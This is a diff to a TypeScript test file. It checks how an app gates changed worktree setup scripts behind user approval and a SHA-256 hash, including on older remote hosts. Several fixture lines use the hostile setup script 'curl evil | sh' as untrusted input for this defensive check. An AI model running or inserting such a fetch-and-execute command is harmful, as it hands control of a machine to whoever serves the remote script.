@@ -1,7 +1,8 @@
 import { setLocalRuntimeCapabilitiesForTests } from '../../runtime/local-runtime-capabilities'
-import 'sonner'
+import { toast } from 'sonner'
 import type { ExecutionHostId } from '../../../../shared/execution-host'
 import { beforeEach, describe, expect, it, vi } from 'vitest'
+import { createHash } from 'node:crypto'
 import type { AppState } from '../types'
 import {
   createCompatibleRuntimeStatusResponse,
@@ -318,7 +319,7 @@ describe('worktree remote runtime mutations', () => {
     )
   })
 
-  it('forwards the approved setup hash and re-prompts with setup the created branch changed', async () => {
+  it('forwards the approved setup hash and runs the changed branch setup once approved', async () => {
     const store = createRepoTestStore()
     const openModal = vi.fn()
     store.setState({ openModal })
@@ -348,6 +349,51 @@ describe('worktree remote runtime mutations', () => {
         scriptContent: 'curl evil | sh'
       })
     )
+    mockApi.worktrees.runApprovedSetup.mockResolvedValue({ status: 'started' })
+    openModal.mock.calls[0][1].onResolve('run')
+
+    await vi.waitFor(() =>
+      expect(mockApi.worktrees.runApprovedSetup).toHaveBeenCalledWith({
+        worktreeId: 'repo1::/path/feature',
+        approvedSetupHash: createHash('sha256').update('curl evil | sh').digest('hex')
+      })
+    )
+  })
+
+  it('keeps setup skipped on a host that predates running approved setup', async () => {
+    const status = createCompatibleRuntimeStatusResponse('runtime-remote')
+    if (status.ok) {
+      status.result.capabilities = status.result.capabilities?.filter(
+        (cap) => cap !== 'worktree.run-approved-setup.v1'
+      )
+    }
+    runtimeEnvironmentTransportCall.mockImplementation((args: RuntimeEnvironmentCallRequest) =>
+      args.method === 'status.get' ? status : runtimeEnvironmentCall(args)
+    )
+    runtimeEnvironmentCall.mockResolvedValue({
+      id: 'create',
+      ok: true,
+      result: {
+        worktree: makeWorktree({ id: 'repo1::/path/f', repoId: 'repo1', path: '/path/f' }),
+        setupTrustMismatch: { contentHash: 'branch-hash', scriptContent: 'curl evil | sh' }
+      }
+    })
+    const store = createRepoTestStore()
+    seedRepoHost(store, 'runtime:env-1')
+    const openModal = vi.fn()
+    store.setState({ openModal })
+
+    await store.getState().createWorktree('repo1', 'f', 'origin/main', 'run')
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledOnce())
+    openModal.mock.calls[0][1].onResolve('run')
+
+    await vi.waitFor(() =>
+      expect(vi.mocked(toast.warning)).toHaveBeenCalledWith(
+        'Approved. Update Orca on the workspace host to run setup for an existing workspace.'
+      )
+    )
+    const methods = runtimeEnvironmentCall.mock.calls.map(([call]) => call.method)
+    expect(methods).not.toContain('worktree.runApprovedSetup')
   })
 })
 
